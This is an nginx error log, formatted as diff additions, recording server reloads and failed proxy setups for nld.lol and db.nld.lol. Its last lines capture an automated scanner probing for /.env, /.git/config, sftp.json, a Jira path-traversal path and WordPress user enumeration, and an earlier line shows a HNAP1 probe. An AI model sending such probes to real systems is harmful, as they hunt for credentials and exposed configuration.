+2023/05/05 21:20:21 [notice] 1#1: signal 29 (SIGIO) received
+2023/05/05 21:21:12 [error] 121#121: *265 "/usr/share/nginx/html/HNAP1/index.html" is not found (2: No such file or directory), client: 193.35.18.61, server: localhost, request: "POST /HNAP1/ HTTP/1.1", host: "87.115.87.90:80"
+2023/05/05 21:21:16 [notice] 122#122: signal process started
+2023/05/05 21:21:16 [notice] 1#1: signal 1 (SIGHUP) received from 122, reconfiguring
+2023/05/05 21:21:16 [notice] 1#1: reconfiguring
+2023/05/05 21:21:16 [notice] 1#1: using the "epoll" event method
+2023/05/05 21:21:16 [notice] 1#1: start worker processes
+2023/05/05 21:21:16 [notice] 1#1: start worker process 127
+2023/05/05 21:21:16 [notice] 121#121: gracefully shutting down
+2023/05/05 21:21:16 [notice] 121#121: exiting
+2023/05/05 21:21:16 [notice] 121#121: exit
+2023/05/05 21:21:16 [notice] 1#1: signal 17 (SIGCHLD) received from 121
+2023/05/05 21:21:16 [notice] 1#1: worker process 121 exited with code 0
+2023/05/05 21:21:16 [notice] 1#1: signal 29 (SIGIO) received
+2023/05/05 21:26:52 [notice] 128#128: signal process started
+2023/05/05 21:26:52 [notice] 1#1: signal 1 (SIGHUP) received from 128, reconfiguring
+2023/05/05 21:26:52 [notice] 1#1: reconfiguring
+2023/05/05 21:26:52 [notice] 1#1: using the "epoll" event method
+2023/05/05 21:26:52 [notice] 1#1: start worker processes
+2023/05/05 21:26:52 [notice] 1#1: start worker process 134
+2023/05/05 21:26:52 [notice] 127#127: gracefully shutting down
+2023/05/05 21:26:52 [notice] 127#127: exiting
+2023/05/05 21:26:52 [notice] 127#127: exit
+2023/05/05 21:26:52 [notice] 1#1: signal 17 (SIGCHLD) received from 127
+2023/05/05 21:26:52 [notice] 1#1: worker process 127 exited with code 0
+2023/05/05 21:26:52 [notice] 1#1: signal 29 (SIGIO) received
+2023/05/05 21:27:09 [error] 134#134: *270 no resolver defined to resolve www.nld.lol, client: 10.3.1.50, server: nld.lol, request: "GET /db HTTP/1.1", host: "www.nld.lol"
+2023/05/05 21:27:09 [error] 134#134: *270 open() "/usr/share/nginx/home/50x.html" failed (2: No such file or directory), client: 10.3.1.50, server: nld.lol, request: "GET /db HTTP/1.1", host: "www.nld.lol"
+2023/05/05 21:27:34 [notice] 135#135: signal process started
+2023/05/05 21:27:34 [notice] 1#1: signal 1 (SIGHUP) received from 135, reconfiguring
+2023/05/05 21:27:34 [notice] 1#1: reconfiguring
+2023/05/05 21:27:34 [notice] 1#1: using the "epoll" event method
+2023/05/05 21:27:34 [notice] 1#1: start worker processes
+2023/05/05 21:27:34 [notice] 1#1: start worker process 141
+2023/05/05 21:27:35 [notice] 134#134: gracefully shutting down
+2023/05/05 21:27:35 [notice] 134#134: exiting
+2023/05/05 21:27:35 [notice] 134#134: exit
+2023/05/05 21:27:35 [notice] 1#1: signal 17 (SIGCHLD) received from 134
+2023/05/05 21:27:35 [notice] 1#1: worker process 134 exited with code 0
+2023/05/05 21:27:35 [notice] 1#1: signal 29 (SIGIO) received
+2023/05/05 21:27:36 [error] 141#141: *271 no resolver defined to resolve www.nld.lol, client: 10.3.1.50, server: nld.lol, request: "GET /db HTTP/1.1", host: "www.nld.lol"
+2023/05/05 21:27:36 [error] 141#141: *271 open() "/usr/share/nginx/home/50x.html" failed (2: No such file or directory), client: 10.3.1.50, server: nld.lol, request: "GET /db HTTP/1.1", host: "www.nld.lol"
+2023/05/05 21:28:19 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
+2023/05/05 21:28:19 [notice] 141#141: gracefully shutting down
+2023/05/05 21:28:19 [notice] 141#141: exiting
+2023/05/05 21:28:19 [notice] 141#141: exit
+2023/05/05 21:28:19 [notice] 1#1: signal 17 (SIGCHLD) received from 141
+2023/05/05 21:28:19 [notice] 1#1: worker process 141 exited with code 0
+2023/05/05 21:28:19 [notice] 1#1: exit
+2023/05/05 21:28:30 [notice] 1#1: using the "epoll" event method
+2023/05/05 21:28:30 [notice] 1#1: nginx/1.23.4
+2023/05/05 21:28:30 [notice] 1#1: built by gcc 10.2.1 20210110 (Debian 10.2.1-6) 
+2023/05/05 21:28:30 [notice] 1#1: OS: Linux 5.15.0-71-generic
+2023/05/05 21:28:30 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
+2023/05/05 21:28:30 [notice] 1#1: start worker processes
+2023/05/05 21:28:30 [notice] 1#1: start worker process 29
+2023/05/05 21:28:32 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
+2023/05/05 21:28:32 [notice] 29#29: gracefully shutting down
+2023/05/05 21:28:32 [notice] 29#29: exiting
+2023/05/05 21:28:32 [notice] 29#29: exit
+2023/05/05 21:28:32 [notice] 1#1: signal 17 (SIGCHLD) received from 29
+2023/05/05 21:28:32 [notice] 1#1: worker process 29 exited with code 0
+2023/05/05 21:28:32 [notice] 1#1: exit
+2023/05/05 21:28:45 [notice] 1#1: using the "epoll" event method
+2023/05/05 21:28:45 [notice] 1#1: nginx/1.23.4
+2023/05/05 21:28:45 [notice] 1#1: built by gcc 10.2.1 20210110 (Debian 10.2.1-6) 
+2023/05/05 21:28:45 [notice] 1#1: OS: Linux 5.15.0-71-generic
+2023/05/05 21:28:45 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
+2023/05/05 21:28:45 [notice] 1#1: start worker processes
+2023/05/05 21:28:45 [notice] 1#1: start worker process 22
+2023/05/05 21:28:49 [error] 22#22: *1 no resolver defined to resolve www.nld.lol, client: 10.3.1.50, server: nld.lol, request: "GET /db HTTP/1.1", host: "www.nld.lol"
+2023/05/05 21:28:49 [error] 22#22: *1 open() "/usr/share/nginx/home/50x.html" failed (2: No such file or directory), client: 10.3.1.50, server: nld.lol, request: "GET /db HTTP/1.1", host: "www.nld.lol"
+2023/05/05 21:29:11 [notice] 23#23: signal process started
+2023/05/05 21:29:15 [notice] 1#1: signal 1 (SIGHUP) received from 23, reconfiguring
+2023/05/05 21:29:15 [notice] 1#1: reconfiguring
+2023/05/05 21:29:17 [error] 22#22: *1 no resolver defined to resolve www.nld.lol, client: 10.3.1.50, server: nld.lol, request: "GET /db HTTP/1.1", host: "www.nld.lol"
+2023/05/05 21:29:17 [error] 22#22: *1 open() "/usr/share/nginx/home/50x.html" failed (2: No such file or directory), client: 10.3.1.50, server: nld.lol, request: "GET /db HTTP/1.1", host: "www.nld.lol"
+2023/05/05 21:29:15 [notice] 1#1: using the "epoll" event method
+2023/05/05 21:29:15 [notice] 1#1: start worker processes
+2023/05/05 21:29:15 [notice] 1#1: start worker process 29
+2023/05/05 21:29:19 [notice] 22#22: gracefully shutting down
+2023/05/05 21:29:19 [notice] 22#22: exiting
+2023/05/05 21:29:19 [notice] 22#22: exit
+2023/05/05 21:29:19 [notice] 1#1: signal 17 (SIGCHLD) received from 22
+2023/05/05 21:29:19 [notice] 1#1: worker process 22 exited with code 0
+2023/05/05 21:29:19 [notice] 1#1: signal 29 (SIGIO) received
+2023/05/05 21:31:05 [error] 29#29: *2 upstream timed out (110: Connection timed out) while connecting to upstream, client: 10.3.1.50, server: nld.lol, request: "GET /db HTTP/1.1", upstream: "https://87.115.87.90:8081/", host: "www.nld.lol"
+2023/05/05 21:31:05 [error] 29#29: *2 open() "/usr/share/nginx/home/50x.html" failed (2: No such file or directory), client: 10.3.1.50, server: nld.lol, request: "GET /db HTTP/1.1", upstream: "https://87.115.87.90:8081/", host: "www.nld.lol"
+2023/05/05 21:31:56 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
+2023/05/05 21:31:56 [notice] 29#29: gracefully shutting down
+2023/05/05 21:31:56 [notice] 29#29: exiting
+2023/05/05 21:31:56 [notice] 29#29: exit
+2023/05/05 21:31:56 [notice] 1#1: signal 17 (SIGCHLD) received from 29
+2023/05/05 21:31:56 [notice] 1#1: worker process 29 exited with code 0
+2023/05/05 21:31:56 [notice] 1#1: exit
+2023/05/05 21:32:06 [notice] 1#1: using the "epoll" event method
+2023/05/05 21:32:06 [notice] 1#1: nginx/1.23.4
+2023/05/05 21:32:06 [notice] 1#1: built by gcc 10.2.1 20210110 (Debian 10.2.1-6) 
+2023/05/05 21:32:06 [notice] 1#1: OS: Linux 5.15.0-71-generic
+2023/05/05 21:32:06 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
+2023/05/05 21:32:06 [notice] 1#1: start worker processes
+2023/05/05 21:32:06 [notice] 1#1: start worker process 28
+2023/05/05 21:35:01 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
+2023/05/05 21:35:01 [notice] 28#28: gracefully shutting down
+2023/05/05 21:35:01 [notice] 28#28: exiting
+2023/05/05 21:35:01 [notice] 28#28: exit
+2023/05/05 21:35:01 [notice] 1#1: signal 17 (SIGCHLD) received from 28
+2023/05/05 21:35:01 [notice] 1#1: worker process 28 exited with code 0
+2023/05/05 21:35:01 [notice] 1#1: exit
+2023/05/05 21:35:19 [emerg] 1#1: host not found in upstream "phpmyadmin" in /etc/nginx/conf.d/nginx.conf:53
+2023/05/05 21:36:14 [emerg] 1#1: host not found in upstream "phpmyadmin" in /etc/nginx/conf.d/nginx.conf:53
+2023/05/05 21:37:28 [notice] 1#1: using the "epoll" event method
+2023/05/05 21:37:28 [notice] 1#1: nginx/1.23.4
+2023/05/05 21:37:28 [notice] 1#1: built by gcc 10.2.1 20210110 (Debian 10.2.1-6) 
+2023/05/05 21:37:28 [notice] 1#1: OS: Linux 5.15.0-71-generic
+2023/05/05 21:37:28 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
+2023/05/05 21:37:28 [notice] 1#1: start worker processes
+2023/05/05 21:37:28 [notice] 1#1: start worker process 21
+2023/05/05 21:38:15 [error] 21#21: *4 SSL_do_handshake() failed (SSL: error:1408F10B:SSL routines:ssl3_get_record:wrong version number) while SSL handshaking to upstream, client: 10.3.1.50, server: nld.lol, request: "GET /db HTTP/1.1", upstream: "https://192.168.32.7:80/", host: "www.nld.lol"
+2023/05/05 21:38:15 [error] 21#21: *4 open() "/usr/share/nginx/home/50x.html" failed (2: No such file or directory), client: 10.3.1.50, server: nld.lol, request: "GET /db HTTP/1.1", upstream: "https://192.168.32.7:80/", host: "www.nld.lol"
+2023/05/05 21:38:34 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
+2023/05/05 21:38:34 [notice] 21#21: gracefully shutting down
+2023/05/05 21:38:34 [notice] 21#21: exiting
+2023/05/05 21:38:34 [notice] 21#21: exit
+2023/05/05 21:38:34 [notice] 1#1: signal 17 (SIGCHLD) received from 21
+2023/05/05 21:38:34 [notice] 1#1: worker process 21 exited with code 0
+2023/05/05 21:38:34 [notice] 1#1: exit
+2023/05/05 21:38:37 [notice] 1#1: using the "epoll" event method
+2023/05/05 21:38:37 [notice] 1#1: nginx/1.23.4
+2023/05/05 21:38:37 [notice] 1#1: built by gcc 10.2.1 20210110 (Debian 10.2.1-6) 
+2023/05/05 21:38:37 [notice] 1#1: OS: Linux 5.15.0-71-generic
+2023/05/05 21:38:37 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
+2023/05/05 21:38:37 [notice] 1#1: start worker processes
+2023/05/05 21:38:37 [notice] 1#1: start worker process 22
+2023/05/05 21:38:41 [error] 22#22: *1 connect() failed (111: Connection refused) while connecting to upstream, client: 10.3.1.50, server: nld.lol, request: "GET /db HTTP/1.1", upstream: "https://192.168.32.7:8081/", host: "www.nld.lol"
+2023/05/05 21:38:41 [error] 22#22: *1 open() "/usr/share/nginx/home/50x.html" failed (2: No such file or directory), client: 10.3.1.50, server: nld.lol, request: "GET /db HTTP/1.1", upstream: "https://192.168.32.7:8081/", host: "www.nld.lol"
+2023/05/05 21:39:41 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
+2023/05/05 21:39:41 [notice] 22#22: gracefully shutting down
+2023/05/05 21:39:41 [notice] 22#22: exiting
+2023/05/05 21:39:41 [notice] 22#22: exit
+2023/05/05 21:39:41 [notice] 1#1: signal 17 (SIGCHLD) received from 22
+2023/05/05 21:39:41 [notice] 1#1: worker process 22 exited with code 0
+2023/05/05 21:39:41 [notice] 1#1: exit
+2023/05/05 21:39:51 [notice] 1#1: using the "epoll" event method
+2023/05/05 21:39:51 [notice] 1#1: nginx/1.23.4
+2023/05/05 21:39:51 [notice] 1#1: built by gcc 10.2.1 20210110 (Debian 10.2.1-6) 
+2023/05/05 21:39:51 [notice] 1#1: OS: Linux 5.15.0-71-generic
+2023/05/05 21:39:51 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
+2023/05/05 21:39:51 [notice] 1#1: start worker processes
+2023/05/05 21:39:51 [notice] 1#1: start worker process 21
+2023/05/05 21:41:04 [crit] 21#21: *2 SSL_do_handshake() failed (SSL: error:14201044:SSL routines:tls_choose_sigalg:internal error) while SSL handshaking, client: 76.164.198.173, server: 0.0.0.0:443
+2023/05/05 21:41:36 [notice] 34#34: signal process started
+2023/05/05 21:41:36 [notice] 1#1: signal 1 (SIGHUP) received from 34, reconfiguring
+2023/05/05 21:41:36 [notice] 1#1: reconfiguring
+2023/05/05 21:41:36 [notice] 1#1: using the "epoll" event method
+2023/05/05 21:41:36 [notice] 1#1: start worker processes
+2023/05/05 21:41:36 [notice] 1#1: start worker process 40
+2023/05/05 21:41:36 [notice] 21#21: gracefully shutting down
+2023/05/05 21:41:36 [notice] 21#21: exiting
+2023/05/05 21:41:36 [notice] 21#21: exit
+2023/05/05 21:41:36 [notice] 1#1: signal 17 (SIGCHLD) received from 21
+2023/05/05 21:41:36 [notice] 1#1: worker process 21 exited with code 0
+2023/05/05 21:41:36 [notice] 1#1: signal 29 (SIGIO) received
+2023/05/05 21:46:09 [notice] 41#41: signal process started
+2023/05/05 21:46:09 [notice] 1#1: signal 1 (SIGHUP) received from 41, reconfiguring
+2023/05/05 21:46:09 [notice] 1#1: reconfiguring
+2023/05/05 21:46:09 [notice] 1#1: using the "epoll" event method
+2023/05/05 21:46:09 [notice] 1#1: start worker processes
+2023/05/05 21:46:09 [notice] 1#1: start worker process 47
+2023/05/05 21:46:09 [notice] 40#40: gracefully shutting down
+2023/05/05 21:46:09 [notice] 40#40: exiting
+2023/05/05 21:46:09 [notice] 40#40: exit
+2023/05/05 21:46:09 [notice] 1#1: signal 17 (SIGCHLD) received from 40
+2023/05/05 21:46:09 [notice] 1#1: worker process 40 exited with code 0
+2023/05/05 21:46:09 [notice] 1#1: signal 29 (SIGIO) received
+2023/05/05 21:46:52 [notice] 48#48: signal process started
+2023/05/05 21:46:52 [notice] 1#1: signal 1 (SIGHUP) received from 48, reconfiguring
+2023/05/05 21:46:52 [notice] 1#1: reconfiguring
+2023/05/05 21:46:52 [notice] 1#1: using the "epoll" event method
+2023/05/05 21:46:52 [notice] 1#1: start worker processes
+2023/05/05 21:46:52 [notice] 1#1: start worker process 53
+2023/05/05 21:46:53 [notice] 47#47: gracefully shutting down
+2023/05/05 21:46:53 [notice] 47#47: exiting
+2023/05/05 21:46:53 [notice] 47#47: exit
+2023/05/05 21:46:53 [notice] 1#1: signal 17 (SIGCHLD) received from 47
+2023/05/05 21:46:53 [notice] 1#1: worker process 47 exited with code 0
+2023/05/05 21:46:53 [notice] 1#1: signal 29 (SIGIO) received
+2023/05/05 21:48:18 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
+2023/05/05 21:48:18 [notice] 53#53: gracefully shutting down
+2023/05/05 21:48:18 [notice] 53#53: exiting
+2023/05/05 21:48:18 [notice] 53#53: exit
+2023/05/05 21:48:18 [notice] 1#1: signal 17 (SIGCHLD) received from 53
+2023/05/05 21:48:18 [notice] 1#1: worker process 53 exited with code 0
+2023/05/05 21:48:18 [notice] 1#1: exit
+2023/05/05 21:48:56 [emerg] 1#1: host not found in upstream "pma" in /etc/nginx/conf.d/nginx.conf:16
+2023/05/05 21:53:16 [notice] 1#1: using the "epoll" event method
+2023/05/05 21:53:16 [notice] 1#1: nginx/1.23.4
+2023/05/05 21:53:16 [notice] 1#1: built by gcc 10.2.1 20210110 (Debian 10.2.1-6) 
+2023/05/05 21:53:16 [notice] 1#1: OS: Linux 5.15.0-71-generic
+2023/05/05 21:53:16 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
+2023/05/05 21:53:16 [notice] 1#1: start worker processes
+2023/05/05 21:53:16 [notice] 1#1: start worker process 21
+2023/05/05 22:05:59 [notice] 22#22: signal process started
+2023/05/05 22:05:59 [notice] 1#1: signal 1 (SIGHUP) received from 22, reconfiguring
+2023/05/05 22:05:59 [notice] 1#1: reconfiguring
+2023/05/05 22:05:59 [notice] 1#1: using the "epoll" event method
+2023/05/05 22:05:59 [notice] 1#1: start worker processes
+2023/05/05 22:05:59 [notice] 1#1: start worker process 27
+2023/05/05 22:05:59 [notice] 21#21: gracefully shutting down
+2023/05/05 22:05:59 [notice] 21#21: exiting
+2023/05/05 22:05:59 [notice] 21#21: exit
+2023/05/05 22:05:59 [notice] 1#1: signal 17 (SIGCHLD) received from 21
+2023/05/05 22:05:59 [notice] 1#1: worker process 21 exited with code 0
+2023/05/05 22:05:59 [notice] 1#1: signal 29 (SIGIO) received
+2023/05/05 22:06:16 [error] 27#27: *110 open() "/usr/share/nginx/html/favicon.ico" failed (2: No such file or directory), client: 10.3.1.50, server: localhost, request: "GET /favicon.ico HTTP/1.1", host: "db.nld.lol", referrer: "http://db.nld.lol/"
+2023/05/05 22:07:59 [notice] 28#28: signal process started
+2023/05/05 22:07:59 [notice] 1#1: signal 1 (SIGHUP) received from 28, reconfiguring
+2023/05/05 22:07:59 [notice] 1#1: reconfiguring
+2023/05/05 22:07:59 [notice] 1#1: using the "epoll" event method
+2023/05/05 22:07:59 [notice] 1#1: start worker processes
+2023/05/05 22:07:59 [notice] 1#1: start worker process 33
+2023/05/05 22:08:00 [notice] 27#27: gracefully shutting down
+2023/05/05 22:08:00 [notice] 27#27: exiting
+2023/05/05 22:08:00 [notice] 27#27: exit
+2023/05/05 22:08:00 [notice] 1#1: signal 17 (SIGCHLD) received from 27
+2023/05/05 22:08:00 [notice] 1#1: worker process 27 exited with code 0
+2023/05/05 22:08:00 [notice] 1#1: signal 29 (SIGIO) received
+2023/05/05 22:08:09 [error] 33#33: *117 open() "/usr/share/nginx/html/favicon.ico" failed (2: No such file or directory), client: 167.94.146.57, server: localhost, request: "GET /favicon.ico HTTP/1.1", host: "87.115.87.90"
+2023/05/05 22:08:10 [error] 33#33: *118 SSL_do_handshake() failed (SSL: error:1408F10B:SSL routines:ssl3_get_record:wrong version number) while SSL handshaking to upstream, client: 10.3.1.50, server: db.nld.lol, request: "GET / HTTP/1.1", upstream: "https://192.168.48.7:80/", host: "db.nld.lol"
+2023/05/05 22:08:10 [error] 33#33: *118 SSL_do_handshake() failed (SSL: error:1408F10B:SSL routines:ssl3_get_record:wrong version number) while SSL handshaking to upstream, client: 10.3.1.50, server: db.nld.lol, request: "GET /favicon.ico HTTP/1.1", upstream: "https://192.168.48.7:80/favicon.ico", host: "db.nld.lol", referrer: "https://db.nld.lol/"
+2023/05/05 22:08:22 [error] 33#33: *118 SSL_do_handshake() failed (SSL: error:1408F10B:SSL routines:ssl3_get_record:wrong version number) while SSL handshaking to upstream, client: 10.3.1.50, server: db.nld.lol, request: "GET / HTTP/1.1", upstream: "https://192.168.48.7:80/", host: "db.nld.lol"
+2023/05/05 22:08:41 [notice] 34#34: signal process started
+2023/05/05 22:08:41 [notice] 1#1: signal 1 (SIGHUP) received from 34, reconfiguring
+2023/05/05 22:08:41 [notice] 1#1: reconfiguring
+2023/05/05 22:08:41 [notice] 1#1: using the "epoll" event method
+2023/05/05 22:08:41 [notice] 1#1: start worker processes
+2023/05/05 22:08:41 [notice] 1#1: start worker process 40
+2023/05/05 22:08:41 [notice] 33#33: gracefully shutting down
+2023/05/05 22:08:41 [notice] 33#33: exiting
+2023/05/05 22:08:41 [notice] 33#33: exit
+2023/05/05 22:08:41 [notice] 1#1: signal 17 (SIGCHLD) received from 33
+2023/05/05 22:08:41 [notice] 1#1: worker process 33 exited with code 0
+2023/05/05 22:08:41 [notice] 1#1: signal 29 (SIGIO) received
+2023/05/05 22:08:42 [error] 40#40: *123 connect() failed (111: Connection refused) while connecting to upstream, client: 10.3.1.50, server: db.nld.lol, request: "GET / HTTP/1.1", upstream: "https://192.168.48.7:443/", host: "db.nld.lol"
+2023/05/05 22:09:47 [notice] 41#41: signal process started
+2023/05/05 22:09:47 [notice] 1#1: signal 1 (SIGHUP) received from 41, reconfiguring
+2023/05/05 22:09:47 [notice] 1#1: reconfiguring
+2023/05/05 22:09:47 [notice] 1#1: using the "epoll" event method
+2023/05/05 22:09:47 [notice] 1#1: start worker processes
+2023/05/05 22:09:47 [notice] 1#1: start worker process 47
+2023/05/05 22:09:47 [notice] 40#40: gracefully shutting down
+2023/05/05 22:09:47 [notice] 40#40: exiting
+2023/05/05 22:09:47 [notice] 40#40: exit
+2023/05/05 22:09:47 [notice] 1#1: signal 17 (SIGCHLD) received from 40
+2023/05/05 22:09:47 [notice] 1#1: worker process 40 exited with code 0
+2023/05/05 22:09:47 [notice] 1#1: signal 29 (SIGIO) received
+2023/05/05 22:09:50 [error] 47#47: *126 connect() failed (111: Connection refused) while connecting to upstream, client: 10.3.1.50, server: db.nld.lol, request: "GET / HTTP/1.1", upstream: "https://192.168.48.7:8080/", host: "db.nld.lol"
+2023/05/05 22:10:00 [error] 47#47: *129 connect() failed (111: Connection refused) while connecting to upstream, client: 10.3.1.50, server: db.nld.lol, request: "GET / HTTP/1.1", upstream: "https://192.168.48.7:8080/", host: "db.nld.lol"
+2023/05/05 22:11:39 [error] 47#47: *134 connect() failed (111: Connection refused) while connecting to upstream, client: 23.178.112.102, server: db.nld.lol, request: "GET /.well-known/acme-challenge/_4QMUeom_d_qJBpgSD3op85DU4W0BW6Xxv_m6Iw__A4 HTTP/1.1", upstream: "https://192.168.48.7:8080/.well-known/acme-challenge/_4QMUeom_d_qJBpgSD3op85DU4W0BW6Xxv_m6Iw__A4", host: "db.nld.lol", referrer: "http://db.nld.lol/.well-known/acme-challenge/_4QMUeom_d_qJBpgSD3op85DU4W0BW6Xxv_m6Iw__A4"
+2023/05/05 22:11:39 [error] 47#47: *135 connect() failed (111: Connection refused) while connecting to upstream, client: 54.201.243.184, server: db.nld.lol, request: "GET /.well-known/acme-challenge/_4QMUeom_d_qJBpgSD3op85DU4W0BW6Xxv_m6Iw__A4 HTTP/1.1", upstream: "https://192.168.48.7:8080/.well-known/acme-challenge/_4QMUeom_d_qJBpgSD3op85DU4W0BW6Xxv_m6Iw__A4", host: "db.nld.lol", referrer: "http://db.nld.lol/.well-known/acme-challenge/_4QMUeom_d_qJBpgSD3op85DU4W0BW6Xxv_m6Iw__A4"
+2023/05/05 22:14:09 [notice] 48#48: signal process started
+2023/05/05 22:14:09 [notice] 1#1: signal 1 (SIGHUP) received from 48, reconfiguring
+2023/05/05 22:14:09 [notice] 1#1: reconfiguring
+2023/05/05 22:14:09 [notice] 1#1: using the "epoll" event method
+2023/05/05 22:14:09 [notice] 1#1: start worker processes
+2023/05/05 22:14:09 [notice] 1#1: start worker process 53
+2023/05/05 22:14:09 [notice] 47#47: gracefully shutting down
+2023/05/05 22:14:09 [notice] 47#47: exiting
+2023/05/05 22:14:09 [notice] 47#47: exit
+2023/05/05 22:14:09 [notice] 1#1: signal 17 (SIGCHLD) received from 47
+2023/05/05 22:14:09 [notice] 1#1: worker process 47 exited with code 0
+2023/05/05 22:14:09 [notice] 1#1: signal 29 (SIGIO) received
+2023/05/05 22:15:05 [error] 53#53: *146 connect() failed (111: Connection refused) while connecting to upstream, client: 34.127.76.225, server: db.nld.lol, request: "GET / HTTP/1.1", upstream: "https://192.168.48.7:8080/", host: "db.nld.lol"
+2023/05/05 22:15:14 [notice] 54#54: signal process started
+2023/05/05 22:15:14 [notice] 1#1: signal 1 (SIGHUP) received from 54, reconfiguring
+2023/05/05 22:15:14 [notice] 1#1: reconfiguring
+2023/05/05 22:15:14 [notice] 1#1: using the "epoll" event method
+2023/05/05 22:15:14 [notice] 1#1: start worker processes
+2023/05/05 22:15:14 [notice] 1#1: start worker process 59
+2023/05/05 22:15:14 [notice] 53#53: gracefully shutting down
+2023/05/05 22:15:14 [notice] 53#53: exiting
+2023/05/05 22:15:14 [notice] 53#53: exit
+2023/05/05 22:15:14 [notice] 1#1: signal 17 (SIGCHLD) received from 53
+2023/05/05 22:15:14 [notice] 1#1: worker process 53 exited with code 0
+2023/05/05 22:15:14 [notice] 1#1: signal 29 (SIGIO) received
+2023/05/05 22:15:23 [error] 59#59: *148 connect() failed (111: Connection refused) while connecting to upstream, client: 10.3.1.50, server: db.nld.lol, request: "GET / HTTP/1.1", upstream: "https://192.168.48.7:8080/", host: "db.nld.lol"
+2023/05/05 22:16:06 [error] 59#59: *151 connect() failed (111: Connection refused) while connecting to upstream, client: 178.62.3.65, server: db.nld.lol, request: "GET / HTTP/1.1", upstream: "https://192.168.48.7:8080/", host: "db.nld.lol"
+2023/05/05 22:16:07 [crit] 59#59: *163 SSL_do_handshake() failed (SSL: error:14201044:SSL routines:tls_choose_sigalg:internal error) while SSL handshaking, client: 178.62.3.65, server: 0.0.0.0:443
+2023/05/05 22:16:07 [error] 59#59: *172 connect() failed (111: Connection refused) while connecting to upstream, client: 178.62.3.65, server: db.nld.lol, request: "GET / HTTP/1.1", upstream: "https://192.168.48.7:8080/", host: "db.nld.lol"
+2023/05/05 22:16:07 [error] 59#59: *175 connect() failed (111: Connection refused) while connecting to upstream, client: 178.62.3.65, server: db.nld.lol, request: "GET /.vscode/sftp.json HTTP/1.1", upstream: "https://192.168.48.7:8080/.vscode/sftp.json", host: "db.nld.lol"
+2023/05/05 22:16:07 [error] 59#59: *178 connect() failed (111: Connection refused) while connecting to upstream, client: 178.62.3.65, server: db.nld.lol, request: "GET /about HTTP/1.1", upstream: "https://192.168.48.7:8080/about", host: "db.nld.lol"
+2023/05/05 22:16:07 [error] 59#59: *181 connect() failed (111: Connection refused) while connecting to upstream, client: 178.62.3.65, server: db.nld.lol, request: "GET /debug/default/view?panel=config HTTP/1.1", upstream: "https://192.168.48.7:8080/debug/default/view?panel=config", host: "db.nld.lol"
+2023/05/05 22:16:08 [error] 59#59: *184 connect() failed (111: Connection refused) while connecting to upstream, client: 178.62.3.65, server: db.nld.lol, request: "GET /v2/_catalog HTTP/1.1", upstream: "https://192.168.48.7:8080/v2/_catalog", host: "db.nld.lol"
+2023/05/05 22:16:08 [error] 59#59: *186 connect() failed (111: Connection refused) while connecting to upstream, client: 178.62.3.65, server: db.nld.lol, request: "GET /ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application HTTP/1.1", upstream: "https://192.168.48.7:8080/ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application", host: "db.nld.lol"
+2023/05/05 22:16:08 [error] 59#59: *189 connect() failed (111: Connection refused) while connecting to upstream, client: 178.62.3.65, server: db.nld.lol, request: "GET /server-status HTTP/1.1", upstream: "https://192.168.48.7:8080/server-status", host: "db.nld.lol"
+2023/05/05 22:16:08 [error] 59#59: *192 connect() failed (111: Connection refused) while connecting to upstream, client: 178.62.3.65, server: db.nld.lol, request: "GET /login.action HTTP/1.1", upstream: "https://192.168.48.7:8080/login.action", host: "db.nld.lol"
+2023/05/05 22:16:08 [error] 59#59: *195 connect() failed (111: Connection refused) while connecting to upstream, client: 178.62.3.65, server: db.nld.lol, request: "GET /_all_dbs HTTP/1.1", upstream: "https://192.168.48.7:8080/_all_dbs", host: "db.nld.lol"
+2023/05/05 22:16:08 [error] 59#59: *198 connect() failed (111: Connection refused) while connecting to upstream, client: 178.62.3.65, server: db.nld.lol, request: "GET /.DS_Store HTTP/1.1", upstream: "https://192.168.48.7:8080/.DS_Store", host: "db.nld.lol"
+2023/05/05 22:16:08 [error] 59#59: *201 connect() failed (111: Connection refused) while connecting to upstream, client: 178.62.3.65, server: db.nld.lol, request: "GET /.env HTTP/1.1", upstream: "https://192.168.48.7:8080/.env", host: "db.nld.lol"
+2023/05/05 22:16:08 [error] 59#59: *203 connect() failed (111: Connection refused) while connecting to upstream, client: 178.62.3.65, server: db.nld.lol, request: "GET /.git/config HTTP/1.1", upstream: "https://192.168.48.7:8080/.git/config", host: "db.nld.lol"
+2023/05/05 22:16:08 [error] 59#59: *208 connect() failed (111: Connection refused) while connecting to upstream, client: 178.62.3.65, server: db.nld.lol, request: "GET /s/0393e27383e2531313e27383/_/;/META-INF/maven/com.atlassian.jira/jira-webapp-dist/pom.properties HTTP/1.1", upstream: "https://192.168.48.7:8080/s/0393e27383e2531313e27383/_/;/META-INF/maven/com.atlassian.jira/jira-webapp-dist/pom.properties", host: "db.nld.lol"
+2023/05/05 22:16:08 [error] 59#59: *210 connect() failed (111: Connection refused) while connecting to upstream, client: 178.62.3.65, server: db.nld.lol, request: "GET /config.json HTTP/1.1", upstream: "https://192.168.48.7:8080/config.json", host: "db.nld.lol"
+2023/05/05 22:16:08 [error] 59#59: *216 connect() failed (111: Connection refused) while connecting to upstream, client: 178.62.3.65, server: db.nld.lol, request: "GET /telescope/requests HTTP/1.1", upstream: "https://192.168.48.7:8080/telescope/requests", host: "db.nld.lol"
+2023/05/05 22:16:09 [error] 59#59: *218 connect() failed (111: Connection refused) while connecting to upstream, client: 178.62.3.65, server: db.nld.lol, request: "GET /?rest_route=/wp/v2/users/ HTTP/1.1", upstream: "https://192.168.48.7:8080/?rest_route=/wp/v2/users/", host: "db.nld.lol"
